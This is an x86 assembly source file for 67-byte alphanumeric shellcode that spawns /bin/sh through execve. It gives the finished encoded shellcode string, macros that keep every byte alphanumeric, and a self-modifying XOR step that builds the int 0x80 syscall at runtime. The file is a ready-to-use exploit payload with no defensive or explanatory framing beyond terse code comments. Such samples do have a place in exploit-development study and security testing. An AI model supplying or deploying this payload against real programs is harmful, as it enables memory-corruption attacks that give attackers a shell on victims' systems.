	/* x86 - alphanumeric execve("/bin/sh", NULL, NULL) - 67 bytes */
# char shellcode[67] =
#  "LLLLYhzeroX5zeroPZf5NNf5aaRfhshfPhabinDfPTXRRRPRRRQaHf5A01GAjAX4JsO";

####		Alphanumeric Macros		####
.macro a_mov arg1, arg2
	push \arg1
	popl \arg2
.endm

.macro a_add n, reg
    .if \n > 0
	inc \reg
	a_add "(\n - 1)" \reg
    .endif
    .if \n < 0
	dec \reg
	a_add "(\n + 1)" \reg
    .endif
.endm

.macro a_eip_popl reg
	a_add -4, %esp
	popl \reg
.endm

.macro a_clear_eax
	a_mov $0x6f72657a, %eax
	xorl $0x6f72657a, %eax
.endm

####			_start			####
.text
.globl _start
_start:
	a_eip_popl %ecx			# %ecx -> _start
	a_clear_eax			# %eax = 0
	a_mov %eax, %edx			# %edx = 0

	xorw $0x4e4e, %ax		# %eax = 0x4e4e
	xorw $0x6161, %ax		# %ax = 0x2f2f = '//'

push_binsh:
	pushl %edx			# %esp -> ""
	pushw $0x6873			# %esp -> "sh"
	pushw %ax			# %esp -> "//sh"
	pushl $0x6e696261		# %esp -> "abin//sh"
	incl %esp
	pushw %ax			# %esp -> "//bin//sh"
#	incl %esp			# %esp -> "/bin//sh"
	a_mov %esp, %eax		# %eax -> "/bin/sh"

fake_pusha:
	pushl %edx			# %eax
	pushl %edx			# %ecx
	pushl %edx			# %edx
	 pushl %eax			# %ebx
	pushl %edx			# ignored
	pushl %edx			# %ebp
	pushl %edx			# %esi
	 pushl %ecx			# %edi
	popa
# %eax = %ecx = %edx = %ebp = %esi = 0 (NULL)
# %ebx -> "/bin/sh"
# %edi -> _start

xor_mask:
	decl %eax			# %eax = -1 = 0xffffffff
	xorw $0x3041, %ax		# ^ (0x41, 0x30) => %ax = (0xbe, 0xcf)

.set OFFSET, 0x41
xor_patching:
	xorl %eax, OFFSET(%edi)		# -> _start + OFFSET = int_0x80_syscall

	a_mov $0x41, %eax
	xorb $0x4a, %al			# %eax = 0x41 ^ 0x4a = 0xb (sys_execve)

int_0x80_syscall:
	.byte 0x73, 0x4f 		# ^ (0xbe, 0xcf) = (0xcd, 0x80)
